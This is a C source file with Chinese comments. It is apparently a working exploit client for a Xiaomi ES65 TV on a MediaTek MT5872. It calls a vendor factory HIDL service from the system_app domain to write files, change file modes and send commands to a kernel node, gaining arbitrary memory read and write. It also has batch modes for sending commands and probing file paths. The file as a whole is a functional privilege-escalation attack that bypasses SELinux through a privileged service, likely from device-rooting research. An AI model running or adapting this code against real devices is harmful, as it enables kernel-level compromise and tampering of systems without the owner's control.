/* ============================================================
 * tvhidl.c — 小米电视 ES65 (baymax/MT5872) HIDL 工厂接口客户端  v2
 *
 * 目标：以 system_app 域（hal_tv_tvfactory_client）调用
 *       vendor.mediatek.tv.mtktvfactory@1.0::IMtkTvFApiSystem
 *       的 write_file()，从而以 hal_tv_tvfactory_default 域的权限
 *       写 /sys/kernel/mik/MI_UTIL  ->  wphy/rmem/wmem 任意内存读写
 *
 * v2 新增：
 *   - 自行写日志文件（因为 runSystemCommand 不捕获 stdout）
 *   - 打印自身 uid/gid/pid + /proc/self/attr/current（确认域）
 *   - 支持 retry / passthrough(getStub=1) 两种取服务方式
 *   - 支持长字符串 std::string（ALTERNATE_STRING_LAYOUT 长模式）
 *
 * 纯 C（无 libc++ 依赖）。所有 ABI 细节由反汇编确定：
 *   - hidl_string   : 16 字节，构造函数在 libhidlbase 导出
 *   - std::string   : 12 字节，libc++ ALTERNATE_STRING_LAYOUT
 *                     byte0 = is_long(bit0) | cap<<1 ; 短串 data @ +1
 *                     长串 : cap@0(uleb-ish) size@4(u32) data@8(ptr)
 * ============================================================ */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <dlfcn.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>

#define PROXY_NAME  "vendor.mediatek.tv.mtktvfactory@1.0.so"
/* ld.config.29.txt: namespace.default.permitted.paths 含 /data，不含 /vendor/lib。
 * 故优先从 /data 下的副本加载（已用 uid0 通道 cp 过去）。*/
static const char *PROXY_CANDIDATES[] = {
    "/data/data/com.mediatek.tv.factory/" PROXY_NAME,
    "/vendor/lib/" PROXY_NAME,
    NULL
};
#define HIDLBASE    "/system/lib/libhidlbase.so"

/* libc++ std::string (ALTERNATE_STRING_LAYOUT, 32-bit) = 12 bytes */
struct lcxx_string { unsigned char b[12]; };

static FILE *g_log = NULL;

static void log_open(void) {
    const char *paths[] = {
        "/data/data/com.mediatek.tv.factory/tvhidl.log",
        "/data/local/tmp/tvhidl.log",
        "/sdcard/tvhidl.log",
        NULL
    };
    for (int i = 0; paths[i]; i++) {
        FILE *f = fopen(paths[i], "w");
        if (f) { g_log = f; fprintf(f, "[tvhidl v2] log=%s\n", paths[i]); fflush(f); break; }
    }
}

static void L(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt); vprintf(fmt, ap); va_end(ap);
    if (g_log) { va_start(ap, fmt); vfprintf(g_log, fmt, ap); va_end(ap); fflush(g_log); }
}

/* 构造 12 字节 libc++ std::string（ALTERNATE_STRING_LAYOUT）*/
static void lcxx_set(struct lcxx_string *s, const char *str) {
    size_t n = strlen(str);
    memset(s, 0, sizeof(*s));
    if (n <= 10) {
        s->b[0] = (unsigned char)(n << 1);        /* is_long = 0, cap = n */
        memcpy(s->b + 1, str, n);
    } else {
        char *buf = (char *)malloc(n + 1);
        memcpy(buf, str, n + 1);
        s->b[0] = (unsigned char)(((n << 1) | 1) & 0xff);   /* is_long = 1, cap = n */
        s->b[1] = 0; s->b[2] = 0; s->b[3] = 0;
        unsigned n32 = (unsigned)n;
        memcpy(s->b + 4, &n32, 4);                 /* size (u32) */
        void *p = buf;
        memcpy(s->b + 8, &p, 4);                   /* data ptr */
    }
}

typedef void (*hidl_string_ctor_t)(void *buf, const char *str);
/* IMtkTvFApiSystem::getService(const std::string&, bool) -> sp<..>  (sret) */
typedef void (*getsvc_t)(void *ret_sp, const void *name, int getStub);
/* BpHwMtkTvFApiSystem::a_hidl_...write_file 成员函数 */
typedef void (*write_file_t)(void *self, const void *data, const void *content, int b1, int b2);
/* 同上，但带 sret 返回缓冲（返回非平凡类型 Return<T> 的真实 ABI）*/
typedef void (*write_file_sret_t)(void *ret, void *self, const void *data,
                                  const void *content, int b1, int b2);
/* check_file / create_file / remove_file : 只有 1 个 hidl_string 参数 */
typedef void (*one_str_sret_t)(void *ret, void *self, const void *a);
/* copy_file(string, string, bool) */
typedef void (*two_str_b_sret_t)(void *ret, void *self, const void *a,
                                 const void *b, int b1);
/* 内层静态 _hidl_ 自由函数（符号签名无歧义）
 * (IInterface* _hidl_this, HidlInstrumentor*, hidl_string const&, hidl_string const&, bool, bool)*/
typedef void (*hidl_inner_t)(void *a0, void *a1, const void *data,
                             const void *content, int b1, int b2);
typedef void (*hidl_inner_sret_t)(void *ret, void *a0, void *a1, const void *data,
                                  const void *content, int b1, int b2);

static void dump(const char *tag, void *p, int n) {
    unsigned char *b = (unsigned char *)p;
    char line[256]; int off = 0;
    for (int i = 0; i < n && off < 200; i++) off += snprintf(line + off, sizeof(line) - off, "%02x ", b[i]);
    L("%s: %s\n", tag, line);
}

static void self_diag(void) {
    L("[diag] pid=%d ppid=%d uid=%d gid=%d euid=%d egid=%d\n",
      getpid(), getppid(), getuid(), getgid(), geteuid(), getegid());
    char ctx[256]; int fd = open("/proc/self/attr/current", O_RDONLY);
    if (fd >= 0) {
        int n = read(fd, ctx, sizeof(ctx) - 1); if (n < 0) n = 0; ctx[n] = 0;
        close(fd);
        L("[diag] SELinux ctx = %s\n", ctx);
    } else L("[diag] attr/current open failed errno=%d\n", errno);

    /* 直接试 open MI_UTIL（预期 denied）*/
    int f2 = open("/sys/kernel/mik/MI_UTIL", O_RDWR);
    L("[diag] open(MI_UTIL,O_RDWR) => %d errno=%d (%s)\n", f2, errno, strerror(errno));
    if (f2 >= 0) { char b[256]; int n = read(f2, b, sizeof(b)-1); if(n<0)n=0; b[n]=0;
                   L("[diag]   MI_UTIL read: %s\n", b); close(f2); }
}

int main(int argc, char **argv) {
    const char *mf_path = "/sys/kernel/mik/MI_UTIL";
    const char *mf_data = "help";
    int passthru = 0, mode = 1;
    int b1 = 0, b2 = 0;
    static char data_buf[1024];
    /* runSystemCommand 按空格分词 -> 用 '~' 代表空格（MI_UTIL 命令不含 '~'）*/
    if (argc >= 3) {
        mf_path = argv[1];
        snprintf(data_buf, sizeof(data_buf), "%s", argv[2]);
        for (char *p = data_buf; *p; p++) if (*p == '~') *p = ' ';
        mf_data = data_buf;
    }
    if (argc >= 4) passthru = atoi(argv[3]);
    if (argc >= 5) mode = atoi(argv[4]);
    if (argc >= 6) b1 = atoi(argv[5]);
    if (argc >= 7) b2 = atoi(argv[6]);

    /* b2==1 : 在 content 末尾追加 '\n'
     * MStar 的 sysfs store 是 "echo" 语义：它按 buf[count-1]=='\n' 来定界，
     * 缺少换行时最后一个有效字符会被当作终止符吃掉 -> 命令被静默截断。
     * 实测：写 "rbank 0x1015"（无换行）retbuf[6]=0xffffffff（store 返回错误），
     *       写 /sys/kernel/mm/ksm/run 成功的路径 retbuf 全 0。 */
    if (b2 == 1 && mf_data == data_buf) {
        size_t L = strlen(data_buf);
        if (L + 1 < sizeof(data_buf)) { data_buf[L] = '\n'; data_buf[L + 1] = 0; }
    }

    log_open();
    L("===== tvhidl v2 start =====\n");
    self_diag();

    void *lib = NULL;
    for (int i = 0; PROXY_CANDIDATES[i]; i++) {
        lib = dlopen(PROXY_CANDIDATES[i], RTLD_NOW | RTLD_GLOBAL);
        if (lib) { L("[+] proxy loaded from %s @ %p\n", PROXY_CANDIDATES[i], lib); break; }
        L("[!] dlopen(%s) failed: %s\n", PROXY_CANDIDATES[i], dlerror());
    }
    if (!lib) { L("[-] cannot load proxy\n"); return 1; }

    void *hb = dlopen(HIDLBASE, RTLD_NOW | RTLD_GLOBAL);
    L("[*] libhidlbase @ %p\n", hb);

    hidl_string_ctor_t hs = (hidl_string_ctor_t)dlsym(hb, "_ZN7android8hardware11hidl_stringC1EPKc");
    if (!hs) hs = (hidl_string_ctor_t)dlsym(hb, "_ZN7android8hardware11hidl_stringC2EPKc");
    L("[*] hidl_string ctor = %p\n", (void *)hs);
    if (!hs) { L("[-] no hidl_string ctor\n"); return 2; }

    getsvc_t getsvc = (getsvc_t)dlsym(lib,
        "_ZN6vendor8mediatek2tv12mtktvfactory4V1_016IMtkTvFApiSystem10getServiceE"
        "RKNSt3__112basic_stringIcNS5_11char_traitsIcEENS5_9allocatorIcEEEEb");
    L("[*] getService = %p\n", (void *)getsvc);
    if (!getsvc) { L("[-] no getService\n"); return 3; }

    struct lcxx_string nm; lcxx_set(&nm, "default");
    dump("std::string(\"default\")", &nm, 12);

    void *svc = NULL;
    getsvc(&svc, &nm, passthru);
    L("[*] IMtkTvFApiSystem = %p (getStub=%d)\n", svc, passthru);
    if (!svc) { L("[-] getService returned null\n"); return 4; }

#define CLS "_ZN6vendor8mediatek2tv12mtktvfactory4V1_019BpHwMtkTvFApiSystem"
#define ARG2 "ERKN7android8hardware11hidl_stringES9_"
#define ARG1 "ERKN7android8hardware11hidl_stringE"

    write_file_sret_t wfs = (write_file_sret_t)dlsym(lib, CLS "33a_hidl_a_mtktvfapi_sys_write_file" ARG2 "bb");
    two_str_b_sret_t  cfs = (two_str_b_sret_t) dlsym(lib, CLS "32a_hidl_a_mtktvfapi_sys_copy_file" ARG2 "b");
    one_str_sret_t    kfs = (one_str_sret_t)   dlsym(lib, CLS "33a_hidl_a_mtktvfapi_sys_check_file" ARG1);
    one_str_sret_t    crf = (one_str_sret_t)   dlsym(lib, CLS "34a_hidl_a_mtktvfapi_sys_create_file" ARG1);
    one_str_sret_t    rmf = (one_str_sret_t)   dlsym(lib, CLS "34a_hidl_a_mtktvfapi_sys_remove_file" ARG1);
    one_str_sret_t    kdr = (one_str_sret_t)   dlsym(lib, CLS "35a_hidl_a_mtktvfapi_sys_check_folder" ARG1);
    hidl_inner_sret_t wis = (hidl_inner_sret_t)dlsym(lib, CLS "39"
        "_hidl_a_hidl_a_mtktvfapi_sys_write_fileEPN7android8hardware10IInterfaceE"
        "PNS6_7details16HidlInstrumentorERKNS6_11hidl_stringESE_bb");

    L("[*] write_file=%p copy_file=%p check_file=%p create_file=%p remove_file=%p\n",
      (void *)wfs, (void *)cfs, (void *)kfs, (void *)crf, (void *)rmf);
    L("[*] _hidl_ write_file=%p\n", (void *)wis);

    char s_path[64], s_data[1024];
    memset(s_path, 0, sizeof(s_path));
    memset(s_data, 0, sizeof(s_data));
    hs(s_path, mf_path);
    hs(s_data, mf_data);
    dump("hidl_string(arg1)", s_path, 16);
    dump("hidl_string(arg2)", s_data, 16);

    static unsigned char retbuf[256];
    L("[*] method=%d b1=%d b2=%d  arg1='%s' arg2='%s'\n", mode, b1, b2, mf_path, mf_data);
    errno = 0;
    switch (mode) {
      case 1: if (!wfs) { L("[-] null\n"); return 5; }
              wfs(retbuf, svc, s_path, s_data, b1, b2); break;   /* write_file */
      case 2: if (!cfs) { L("[-] null\n"); return 5; }
              cfs(retbuf, svc, s_path, s_data, b1); break;       /* copy_file  */
      case 3: if (!kfs) { L("[-] null\n"); return 5; }
              kfs(retbuf, svc, s_path); break;                   /* check_file */
      case 4: if (!crf) { L("[-] null\n"); return 5; }
              crf(retbuf, svc, s_path); break;                   /* create_file*/
      case 5: if (!rmf) { L("[-] null\n"); return 5; }
              rmf(retbuf, svc, s_path); break;                   /* remove_file*/
      case 99: if (!wis) { L("[-] null\n"); return 5; }
              wis(retbuf, svc, NULL, s_path, s_data, b1, b2); break;
      case 50: {   /* 批处理：argv[1] = 命令文件（每行一条 MI_UTIL 命令）*/
              FILE *cf = fopen(mf_path, "r");
              if (!cf) { L("[-] cannot open cmd-file '%s' errno=%d\n", mf_path, errno); return 7; }
              if (!wfs) { L("[-] null wfs\n"); return 5; }
              static unsigned char node[64];
              memset(node, 0, sizeof(node));
              hs(node, "/sys/kernel/mik/MI_UTIL");
              char line[512]; int n = 0;
              while (fgets(line, sizeof(line), cf)) {
                  size_t L2 = strlen(line);
                  while (L2 && (line[L2-1] == '\n' || line[L2-1] == '\r')) line[--L2] = 0;
                  if (!L2) continue;
                  static char tmp[600];
                  snprintf(tmp, sizeof(tmp), "%s\n", line);
                  memset(s_data, 0, 16);
                  hs(s_data, tmp);
                  memset(retbuf, 0, 32);
                  wfs(retbuf, svc, node, s_data, 0, 0);
                  n++;
                  L("[%02d] '%s' -> ret %08x %08x %08x %08x\n", n, line,
                    ((unsigned*)retbuf)[0], ((unsigned*)retbuf)[1],
                    ((unsigned*)retbuf)[2], ((unsigned*)retbuf)[3]);
              }
              fclose(cf);
              L("[*] batch complete: %d commands\n", n);
              break;
          }
      case 60: {   /* 批量 check_file：argv[1] = 路径列表文件（每行一个路径）*/
              FILE *cf = fopen(mf_path, "r");
              if (!cf) { L("[-] cannot open list '%s' errno=%d\n", mf_path, errno); return 7; }
              if (!kfs) { L("[-] null kfs\n"); return 5; }
              char line[512]; int n = 0, ok = 0;
              while (fgets(line, sizeof(line), cf)) {
                  size_t L2 = strlen(line);
                  while (L2 && (line[L2-1] == '\n' || line[L2-1] == '\r')) line[--L2] = 0;
                  if (!L2) continue;
                  static unsigned char nb[64];
                  memset(nb, 0, sizeof(nb));
                  hs(nb, line);
                  memset(retbuf, 0, 32);
                  kfs(retbuf, svc, nb);
                  n++;
                  int rv = (int)((unsigned *)retbuf)[6];
                  if (rv == 0) ok++;
                  L("[%02d] rv=%-11d %s\n", n, rv, line);
              }
              fclose(cf);
              L("[*] checked %d paths, %d OK\n", n, ok);
              break;
          }
      case 61: {   /* 批量 check_folder：同 60，但调用 check_folder */
              FILE *cf = fopen(mf_path, "r");
              if (!cf) { L("[-] cannot open list '%s' errno=%d\n", mf_path, errno); return 7; }
              if (!kdr) { L("[-] null check_folder\n"); return 5; }
              char line[512]; int n = 0, ok = 0;
              while (fgets(line, sizeof(line), cf)) {
                  size_t L2 = strlen(line);
                  while (L2 && (line[L2-1] == '\n' || line[L2-1] == '\r')) line[--L2] = 0;
                  if (!L2) continue;
                  static unsigned char nb[64];
                  memset(nb, 0, sizeof(nb));
                  hs(nb, line);
                  memset(retbuf, 0, 32);
                  kdr(retbuf, svc, nb);
                  n++;
                  int rv = (int)((unsigned *)retbuf)[6];
                  if (rv == 0) ok++;
                  L("[%02d] rv=%-11d %s\n", n, rv, line);
              }
              fclose(cf);
              L("[*] checked %d folders, %d OK\n", n, ok);
              break;
          }
      case 6: {    /* change_file_mode(hidl_string path, uint32_t mode) */
              typedef void (*cfm_sret_t)(void *ret, void *self, const void *p, unsigned mode);
              cfm_sret_t cfm = (cfm_sret_t)dlsym(lib, CLS "39a_hidl_a_mtktvfapi_sys_change_file_mode" ARG1 "j");
              if (!cfm) { L("[-] no change_file_mode\n"); return 5; }
              memset(retbuf, 0, 32);
              cfm(retbuf, svc, s_path, (unsigned)b1);
              L("[*] change_file_mode('%s', 0%o) rv=%d\n", mf_path, b1, (int)((unsigned *)retbuf)[6]);
              break;
          }
      default: L("[-] bad method\n"); return 6;
    }
    L("[+] call returned (errno=%d)\n", errno);
    dump("retbuf[0..31]", retbuf, 32);
    {
        unsigned *u = (unsigned *)retbuf;
        L("[*] retbuf u32: %08x %08x %08x %08x %08x %08x %08x %08x\n",
          u[0], u[1], u[2], u[3], u[4], u[5], u[6], u[7]);
    }

    /* 读回验证（system_app 预期无权限）*/
    FILE *f = fopen("/sys/kernel/mik/MI_UTIL", "r");
    if (f) { char buf[512]; size_t n = fread(buf, 1, sizeof(buf)-1, f); buf[n]=0;
             L("[+] readback: %s\n", buf); fclose(f); }
    else L("[*] readback denied errno=%d (expected for system_app)\n", errno);

    L("===== tvhidl v2 end =====\n");
    if (g_log) fclose(g_log);
    return 0;
}
